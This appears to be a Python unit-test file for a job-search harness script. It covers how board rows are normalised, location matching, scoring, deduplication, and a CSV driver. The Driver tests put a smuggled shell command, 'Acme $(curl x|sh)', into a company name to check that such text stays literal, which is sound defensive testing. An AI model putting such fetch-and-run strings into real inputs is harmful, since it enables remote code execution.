"""Tests for harness/lite_search.py - the pure parts only (no network, no bun).

`/lite search` reads this script's rows instead of the job-scraper skill and every portal
SKILL.md, so its mistakes would be silent. The ones worth pinning:

* `normalise` - each board names its fields differently (jobnet `hiringOrgName` and no
  URL, jobdanmark `companyName` and DD-MM-YYYY dates). A missed fallback blanks every
  company on that board, and the dedupe keys with it.
* `near_home` - a substring match lets "mb" pass "Mumbai"; whole words only.
* `dedupe` - the seen_jobs.json and tracker checks are what stop yesterday's jobs coming
  back as new, and what keeps lite and the full /scrape on one memory.
* `discover_boards` - workflow pointer skills share `.agents/skills/`; only `*-search`
  folders are portals.
"""

from __future__ import annotations

import shutil
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "harness"))

import lite_search as ls  # noqa: E402


class Normalise(unittest.TestCase):
    def test_shared_shape_passes_through(self):
        job = ls.normalise({"id": "42", "title": "Data Analyst", "company": "Acme",
                            "location": "Winnipeg, MB", "date": "2026-09-22",
                            "url": "https://example.com/42"}, "linkedin-search")
        self.assertEqual(("Data Analyst", "Acme", "Winnipeg, MB", "2026-09-22", "42"),
                         (job["title"], job["company"], job["location"], job["date"],
                          job["id"]))
        self.assertEqual("linkedin-search", job["board"])

    def test_jobnet_fields_and_url_template(self):
        job = ls.normalise({"jobAdId": "abc-1", "title": "Analytiker",
                            "hiringOrgName": "Acme", "municipality": None,
                            "postalDistrictName": None, "workPlaceAddress": "   ",
                            "country": "Danmark",
                            "publicationDate": "2026-10-01T00:00:00+02:00",
                            "applicationDeadline": "2027-01-01T00:00:00+01:00"},
                           "jobnet-search")
        self.assertEqual("Acme", job["company"])
        self.assertEqual("Danmark", job["location"], "whitespace is not a location")
        self.assertEqual("https://jobnet.dk/job/abc-1", job["url"])
        self.assertEqual(("2026-10-01", "2027-01-01"), (job["date"], job["deadline"]))

    def test_jobdanmark_fields_and_day_first_dates(self):
        job = ls.normalise({"slug": "data-analyst-acme", "title": "Data Analyst",
                            "companyName": "Acme", "companyAddress": "Taastrup",
                            "publishedDate": "30-09-2026",
                            "applicationDeadline": "13-10-2026",
                            "url": "https://example.com/job/data-analyst-acme"},
                           "jobdanmark-search")
        self.assertEqual(("data-analyst-acme", "Acme", "Taastrup"),
                         (job["id"], job["company"], job["location"]))
        self.assertEqual(("2026-09-30", "2026-10-13"), (job["date"], job["deadline"]))

    def test_non_date_deadline_is_dropped(self):
        self.assertEqual("", ls.iso_date("ASAP"))
        self.assertEqual("", ls.normalise({"title": "x", "deadline": "ASAP"}, "b")["deadline"])

    def test_work_mode_is_shown_in_the_location(self):
        job = ls.normalise({"title": "Engineer", "location": None, "work_mode": "remote"},
                           "freehire-search")
        self.assertEqual("(remote)", job["location"])


class Location(unittest.TestCase):
    TOKENS = ls.home_tokens("Winnipeg, Manitoba, Canada")

    def test_home_tokens_city_first(self):
        self.assertEqual(["winnipeg", "manitoba", "canada"], self.TOKENS)

    def test_any_home_part_matches(self):
        self.assertTrue(ls.near_home("Winnipeg (MB)", self.TOKENS, False))
        self.assertTrue(ls.near_home("Manitoba, Canada", self.TOKENS, False))
        self.assertFalse(ls.near_home("Aarhus C", self.TOKENS, False))

    def test_whole_words_only(self):
        self.assertFalse(ls.near_home("Mumbai, India", ls.home_tokens("Winnipeg, MB"), False))

    def test_the_country_alone_is_not_near(self):
        """End-to-end run: Winnipeg home listed North Vancouver and Thunder Bay jobs."""
        self.assertFalse(ls.near_home("North Vancouver, BC, Canada", self.TOKENS, False))
        self.assertEqual((["winnipeg", "mb"], ""), ls.split_home(ls.home_tokens("Winnipeg, MB")))

    def test_remote_passes_only_when_accepted_and_open_to_home(self):
        self.assertTrue(ls.near_home("Remote", self.TOKENS, True))
        self.assertTrue(ls.near_home("Canada (remote)", self.TOKENS, True))
        self.assertTrue(ls.near_home("Worldwide (remote)", self.TOKENS, True))
        self.assertFalse(ls.near_home("Remote", self.TOKENS, False))
        # A remote job tied to another country (e2e: a US campus job) is not open to home.
        self.assertFalse(ls.near_home("Atlanta, GA, United States (remote)", self.TOKENS, True))
        self.assertFalse(ls.near_home("Berlin (remote)", self.TOKENS, True))

    def test_place_keeps_the_remote_tag_when_clipped(self):
        self.assertTrue(ls.place("Emory Campus-Clifton Corridor, Atlanta, GA (remote)")
                        .endswith("(remote)"))

    def test_hybrid_elsewhere_does_not_pass(self):
        self.assertFalse(ls.near_home("Berlin (hybrid)", self.TOKENS, True))


class Scoring(unittest.TestCase):
    PHRASES = ["Environmental Data Analyst", "water quality data analyst"]

    def test_full_title_match_and_city_bonus(self):
        self.assertEqual(90, ls.score("Environmental Data Analyst", self.PHRASES))
        self.assertEqual(100, ls.score("Senior Environmental Data Analyst", self.PHRASES,
                                       "Winnipeg, MB", "winnipeg"))

    def test_partial_and_unrelated(self):
        self.assertEqual(60, ls.score("Data Analyst", self.PHRASES))
        self.assertEqual(0, ls.score("Line Cook", self.PHRASES))

    def test_stopwords_and_punctuation_do_not_count(self):
        self.assertEqual(90, ls.score("Analyst, Data - Environmental", ["the data analyst"]))

    def test_fit_bands(self):
        self.assertEqual(["high", "medium", "medium", "low"],
                         [ls.fit(n) for n in (70, 69, 40, 39)])


class Dedupe(unittest.TestCase):
    def job(self, title="Data Analyst", company="Acme", location="Winnipeg", url="u1"):
        return {"title": title, "company": company, "location": location, "url": url}

    def test_repeats_within_the_run(self):
        jobs = [self.job(), self.job(url="u1"), self.job(url="u2"),
                self.job(url="u3", location="Brandon")]
        self.assertEqual(["u1", "u3"], [j["url"] for j in ls.dedupe(jobs, {}, [])])

    def test_seen_jobs_by_url_or_company_and_title(self):
        seen = {"u1": {"url": "u1"},
                "acme_analyst": {"company": "ACME", "title": "Analyst", "url": ""}}
        jobs = [self.job(), self.job(title="Analyst", url="u9"), self.job(url="u2", title="New")]
        self.assertEqual(["u2"], [j["url"] for j in ls.dedupe(jobs, seen, [])])

    def test_tracker_company_and_role(self):
        tracker = [{"company": "acme", "role": "data analyst"}]
        self.assertEqual([], ls.dedupe([self.job()], {}, tracker))

    def test_remember_adds_new_entries_and_never_touches_old_ones(self):
        data = {"seen": {"u1": {"title": "Old", "status": "ranked", "rank_score": 80}}}
        jobs = [dict(self.job(), fit="high", board="linkedin-search"),
                dict(self.job(url="u2"), fit="low", board="jobindex-search")]
        self.assertEqual(1, ls.remember(data, jobs, "2026-10-02"))
        self.assertEqual({"title": "Old", "status": "ranked", "rank_score": 80},
                         data["seen"]["u1"])
        self.assertEqual({"title": "Data Analyst", "company": "Acme", "url": "u2",
                          "first_seen": "2026-10-02", "fit": "low", "status": "new",
                          "portal": "jobindex-search"}, data["seen"]["u2"])


class Positions(unittest.TestCase):
    def test_active_positions_in_rank_order_on_their_first_term(self):
        prefs = {"target_positions": {"positions": [
            {"rank": 2, "title": "B", "search_terms": ["b one", "b two"], "status": "active"},
            {"rank": 1, "title": "A", "search_terms": ["a one"], "status": "active"},
            {"rank": 3, "title": "C", "search_terms": ["c"], "status": "dropped"}]},
            "role_families": ["ignored while positions exist"]}
        found = ls.load_positions(prefs, 5)
        self.assertEqual([("A", "a one"), ("B", "b one")],
                         [(p["title"], p["query"]) for p in found])
        self.assertEqual(["B", "b one", "b two"], found[1]["phrases"])
        self.assertEqual(1, len(ls.load_positions(prefs, 1)))

    def test_fallback_to_role_families_and_trial_families(self):
        prefs = {"role_families": ["lab operations"],
                 "discovery": {"trial_families": [
                     {"name": "business analysis", "status": "trial"},
                     {"name": "technical writing", "status": "dropped"}]}}
        found = ls.load_positions(prefs, 5)
        self.assertEqual([("lab operations", False), ("business analysis", True)],
                         [(p["query"], p["trial"]) for p in found])

    def test_nothing_to_search(self):
        self.assertEqual([], ls.load_positions({}, 5))
        self.assertEqual([], ls.load_positions(
            {"target_positions": {"positions": [{"title": "A", "status": "dropped"}]}}, 5))


class Boards(unittest.TestCase):
    def test_enabled_toggle(self):
        self.assertTrue(ls.board_enabled("---\nname: x\nenabled: true  # note\n---\n"))
        self.assertFalse(ls.board_enabled("---\nname: x\nenabled: false\n---\n"))
        self.assertTrue(ls.board_enabled("---\nname: x\n---\n"), "missing key = enabled")
        self.assertTrue(ls.board_enabled("# no frontmatter\n"))

    def test_only_search_folders_are_boards(self):
        tmp = Path(tempfile.mkdtemp(prefix="lite-boards-"))
        try:
            for name, flag in (("alpha-search", "true"), ("beta-search", "false"),
                               ("lite", "true")):
                folder = tmp / ".agents" / "skills" / name
                folder.mkdir(parents=True)
                (folder / "SKILL.md").write_text(
                    f"---\nname: {name}\nenabled: {flag}\n---\n", encoding="utf-8")
            self.assertEqual((["alpha-search"], ["beta-search"]), ls.discover_boards(tmp))
        finally:
            shutil.rmtree(tmp, ignore_errors=True)

    def test_another_countrys_boards_are_skipped_only_when_home_is_known(self):
        boards = ["linkedin-search", "jobbank-ca-search", "jobindex-search"]
        self.assertEqual(["jobindex-search"],
                         ls.other_market(boards, ls.home_tokens("Winnipeg, MB")))
        self.assertEqual(["jobbank-ca-search"],
                         ls.other_market(boards, ls.home_tokens("Aarhus, Denmark")))
        self.assertEqual([], ls.other_market(boards, ls.home_tokens("London, UK")))
        self.assertEqual([], ls.other_market(boards, []))


class EveryBoardFails(unittest.TestCase):
    def test_exit_1_and_the_codex_network_pointer(self):
        """Codex's sandbox blocks the network by default, so every board fails at once;
        the output must say "could not search" and point at the fix, never "no jobs"."""
        import io
        import subprocess
        from unittest import mock

        tmp = Path(tempfile.mkdtemp(prefix="lite-fail-"))
        try:
            skill = tmp / ".agents" / "skills" / "alpha-search" / "SKILL.md"
            skill.parent.mkdir(parents=True)
            skill.write_text("---\nname: alpha-search\n---\n", encoding="utf-8")
            (tmp / "preferences.yaml").write_text(
                "target_positions:\n  - {title: Data Analyst, status: active}\n",
                encoding="utf-8")
            failed = subprocess.CompletedProcess(
                [], 1, stdout="", stderr='{"error": "fetch failed", "code": "NETWORK"}')
            out = io.StringIO()
            with mock.patch.object(ls.shutil, "which", return_value="bun"), \
                 mock.patch.object(ls.subprocess, "run", return_value=failed), \
                 mock.patch.object(ls.sys, "stdout", out):
                code = ls.search(ls.argparse.Namespace(
                    root=str(tmp), preferences=None, state_dir=None, top=1, boards=None,
                    limit=10, record=False))
            self.assertEqual(1, code)
            self.assertIn("This is not 'no new jobs'", out.getvalue())
            self.assertIn("Job search in Codex needs network access", out.getvalue())
        finally:
            shutil.rmtree(tmp, ignore_errors=True)


class Save(unittest.TestCase):
    """--save archives the posting so the model never retypes it (the e2e run wrote
    every posting twice, by hand)."""

    def test_row_is_fetched_and_archived_where_apply_package_looks(self):
        import json
        import subprocess
        from types import SimpleNamespace
        from unittest import mock

        tmp = Path(tempfile.mkdtemp(prefix="lite-save-"))
        try:
            (tmp / "state").mkdir()
            row = {"title": "Data Analyst", "company": "Acme", "location": "Winnipeg, MB",
                   "url": "https://example.com/1", "id": "42", "board": "linkedin-search"}
            (tmp / "state" / "lite-last-search.json").write_text(
                json.dumps({"date": "2026-10-02", "results": [row]}), encoding="utf-8")
            body = "Requirements: SQL, Excel and stakeholder reporting. " * 20
            done = subprocess.CompletedProcess([], 0, stdout=body, stderr="")
            with mock.patch.object(ls.shutil, "which", return_value="bun"), \
                 mock.patch.object(ls.subprocess, "run", return_value=done), \
                 mock.patch("builtins.print"):
                code = ls.save(SimpleNamespace(root=str(tmp), save=1))
            self.assertEqual(0, code)
            folder = next((tmp / "documents" / "applications").iterdir())
            self.assertIn("SQL, Excel", (folder / "job_posting.md").read_text(encoding="utf-8"))
            self.assertIn("posting_state: verified",
                          (folder / "provenance.md").read_text(encoding="utf-8"))
            self.assertTrue((folder / "posting_source" / "linkedin-search_detail.md").is_file())
        finally:
            shutil.rmtree(tmp, ignore_errors=True)


class Driver(unittest.TestCase):
    """Posting text reaches the CSVs as Python values, never through a shell, so `$`
    and `$(...)` in a company, title or salary stay literal (review finding: a
    double-quoted rationale turned "$85,000" into "5,000")."""

    def setUp(self):
        import json
        self.json = json
        self.tmp = Path(tempfile.mkdtemp(prefix="lite-driver-"))
        (self.tmp / "state").mkdir()
        (self.tmp / "state" / "lite-apply.json").write_text(json.dumps({
            "company": "Acme $(curl x|sh)", "role": "Analyst $85,000",
            "url": "https://example.com/1", "location": "Winnipeg", "channel": "pasted"}),
            encoding="utf-8")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def run_main(self, *args):
        from unittest import mock
        with mock.patch("builtins.print"), mock.patch.object(ls.sys.stdout, "reconfigure"):
            return ls.main(["--root", str(self.tmp), *args])

    def test_start_then_verdict_keeps_hostile_text_literal(self):
        self.assertEqual(0, self.run_main("--start"))
        meta = self.json.loads((self.tmp / "state" / "lite-apply.json").read_text(encoding="utf-8"))
        self.assertTrue((self.tmp / meta["folder"] / "posting_source").is_dir())
        self.assertEqual(0, self.run_main("--verdict", "not-drafted", "--score", "55",
                                          "--rationale", "fit too low"))
        text = (self.tmp / "shortlist.csv").read_text(encoding="utf-8")
        self.assertIn("Acme $(curl x|sh)", text)
        self.assertIn("Analyst $85,000", text)

    def test_package_uses_the_stored_values_and_archives_a_pasted_posting(self):
        from unittest import mock
        self.run_main("--start")
        meta = self.json.loads((self.tmp / "state" / "lite-apply.json").read_text(encoding="utf-8"))
        (self.tmp / meta["folder"] / "job_posting.md").write_text("posting text", encoding="utf-8")
        import apply_package
        with mock.patch.object(apply_package, "main", return_value=0) as built:
            self.assertEqual(0, self.run_main("--package", "--score", "82",
                                              "--rationale", "strong match"))
        argv = built.call_args.args[0]
        self.assertEqual("Acme $(curl x|sh)", argv[argv.index("--company") + 1])
        self.assertEqual(f"cv/main_{meta['slug']}.tex", argv[argv.index("--cv") + 1])
        self.assertTrue((self.tmp / meta["folder"] / "posting_source" / "posting.md").is_file())
        self.assertIn("qualified", (self.tmp / "shortlist.csv").read_text(encoding="utf-8"))

    def test_applied_marks_the_posting_in_progress_submitted(self):
        from unittest import mock
        import tracker_row
        self.run_main("--start")
        tracker = self.tmp / "tracker.csv"
        tracker_row.append({"company": "Acme $(curl x|sh)", "role": "Analyst $85,000",
                            "status": "in_progress"}, tracker)
        with mock.patch.object(tracker_row, "TRACKER_CSV", tracker):
            self.assertEqual(0, self.run_main("--applied"))
            row = tracker_row.read_rows(tracker)[0][0]
            self.assertTrue(row["submitted_date"])
            self.assertTrue(row["notes"].startswith("submitted"))
            # Submission ends the in-progress posting; a later outcome names it by a word.
            self.assertFalse((self.tmp / "state" / "lite-apply.json").exists())
            self.assertEqual(0, self.run_main("--applied", "rejected", "--match", "acme"))
            self.assertEqual(1, self.run_main("--applied", "rejected", "--match", "zzz"))
        self.assertEqual("rejected", tracker_row.read_rows(tracker)[0][0]["status"])

    def test_a_byte_order_mark_does_not_break_the_driver(self):
        """Codex on Windows PowerShell 5.1 writes UTF-8 with a BOM (Set-Content
        -Encoding UTF8); the driver must still read the file it wrote."""
        path = self.tmp / "state" / "lite-apply.json"
        path.write_bytes(b"\xef\xbb\xbf" + path.read_bytes())
        self.assertEqual(0, self.run_main("--start"))

    def test_start_from_archives_a_posting_file(self):
        posting = self.tmp / "posting.txt"
        posting.write_text("Data analyst wanted. Requirements: SQL and Excel. " * 12,
                           encoding="utf-8")
        self.assertEqual(0, self.run_main("--start", "--from", str(posting)))
        meta = self.json.loads((self.tmp / "state" / "lite-apply.json").read_text(encoding="utf-8"))
        folder = self.tmp / meta["folder"]
        self.assertIn("Requirements: SQL", (folder / "job_posting.md").read_text(encoding="utf-8"))
        self.assertIn("posting_state: unverified",
                      (folder / "provenance.md").read_text(encoding="utf-8"))
        self.assertTrue((folder / "posting_source" / "posting.md").is_file())


class LiteSpec(unittest.TestCase):
    def test_an_application_reads_about_the_7_kb_the_docs_promise(self):
        """README, USER-GUIDE, setup and the installer say a lite application reads
        about 7 KB of instructions (against about 160 KB on the standard route): the
        router, injected on every /lite call, plus the apply steps."""
        size = sum((ROOT / path).stat().st_size
                   for path in (".claude/commands/lite.md", ".claude/lite/apply.md"))
        self.assertLess(size, 8 * 1024)

    def test_lite_never_sends_every_session_through_runtime_map(self):
        """RUNTIME-MAP.md is ~13 KB; reading it on every lite session nearly tripled a
        lite application's instructions. The router carries the Codex rule inline."""
        router = (ROOT / ".claude" / "commands" / "lite.md").read_text(encoding="utf-8")
        pointer = (ROOT / ".agents" / "skills" / "lite" / "SKILL.md").read_text(encoding="utf-8")
        self.assertNotIn("Apply `RUNTIME-MAP.md` once per session", router)
        self.assertIn("$lite", router)
        self.assertNotIn("applying `RUNTIME-MAP.md`", pointer)

    def test_the_router_names_every_step_file_it_delegates_to(self):
        router = (ROOT / ".claude" / "commands" / "lite.md").read_text(encoding="utf-8")
        for step_file in (".claude/lite/setup.md", ".claude/lite/apply.md"):
            self.assertIn(step_file, router)
            self.assertTrue((ROOT / step_file).is_file(), step_file)


if __name__ == "__main__":
    unittest.main()
